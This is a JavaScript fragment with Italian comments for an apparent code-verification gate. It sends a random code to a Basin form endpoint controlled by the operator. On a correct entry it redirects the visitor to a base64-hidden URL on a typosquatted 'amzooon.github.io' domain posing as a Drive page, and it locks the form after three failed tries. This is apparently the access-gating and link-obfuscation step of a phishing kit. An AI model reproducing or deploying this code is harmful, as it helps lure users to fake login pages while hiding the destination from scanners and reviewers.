        const verificationForm = document.getElementById('verificationForm');
        const sendCodeBtn = document.getElementById('sendCodeBtn');
        const verificationCodeInput = document.getElementById('verificationCode');
        const verifyBtn = document.getElementById('verifyBtn');
        const attemptsMessage = document.getElementById('attemptsMessage');
        const dots = document.getElementById('dots');

        let generatedCode = '';
        let attemptCount = 0;

        // Funzione per generare un codice casuale di 20 caratteri
        function generateVerificationCode() {
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let code = '';
            for (let i = 0; i < 20; i++) {
                code += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            return code;
        }

// Invio del codice di verifica tramite Basin
sendCodeBtn.addEventListener('click', () => {
    generatedCode = generateVerificationCode();

    fetch("https://usebasin.com/f/d8f478453745", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ codice: generatedCode })
    }).then(response => {
        if (response.ok) {
            sendCodeBtn.classList.add('fade-out');
            setTimeout(() => {
                sendCodeBtn.style.display = 'none';
                verificationCodeInput.style.display = 'block';
                verifyBtn.style.display = 'block';
                verificationCodeInput.classList.add('show');
                verifyBtn.classList.add('show');
            }, 500);
        } else {
            errorMessage.textContent = "Errore nell'invio del codice. Riprova.";
        }
    }).catch(error => {
        errorMessage.textContent = "Errore di connessione. Riprova.";
    });
});

// Funzione per animare i puntini
        function animateDots() {
            let dotCount = 0;
            setInterval(() => {
                dotCount++;
                if (dotCount > 3) {
                    dotCount = 1; // Resetta i puntini dopo 3
                }
                dots.textContent = '.'.repeat(dotCount); // Aggiungi i puntini
            }, 500); // Cambia ogni 0.5 secondi
        }

        // Verifica del codice inserito dall'utente
        verificationForm.addEventListener('submit', (e) => {
            e.preventDefault();
            const userCode = verificationCodeInput.value;

            if (userCode === generatedCode) {
                const redirectUrl = atob("aHR0cHM6Ly9hbXpvb29uLmdpdGh1Yi5pby9jaGFybGllL2RyaXZlLTY4N2MwZTMzLTg0MzAtODAwOS05ZDdiLWFlNTY5YzAzZDVjODY4N2MwZTMzLTg0MzAtODAwOS05ZDdiLWFlNTY5YzAzZDVjOC5odG1s");
                window.location.href = redirectUrl;
            } else {
                attemptCount++;
                if (attemptCount >= 3) {
                    // Nascondi il form e mostra il messaggio di errore
                    sendCodeBtn.style.display = 'none';
                    verificationCodeInput.style.display = 'none';
                    verifyBtn.style.display = 'none';
                    attemptsMessage.style.display = 'block'; // Mostra il messaggio di tentativi falliti
                    animateDots(); // Avvia l'animazione dei puntini

                    // Disabilita ulteriormente il form
                    sendCodeBtn.disabled = true;
                    verificationCodeInput.disabled = true;
                    verifyBtn.disabled = true;

                    setTimeout(() => {
                        location.reload(); // Ricarica la pagina dopo 5 secondi
                    }, 5000); // 5000 millisecondi = 5 secondi
                }
            }
        });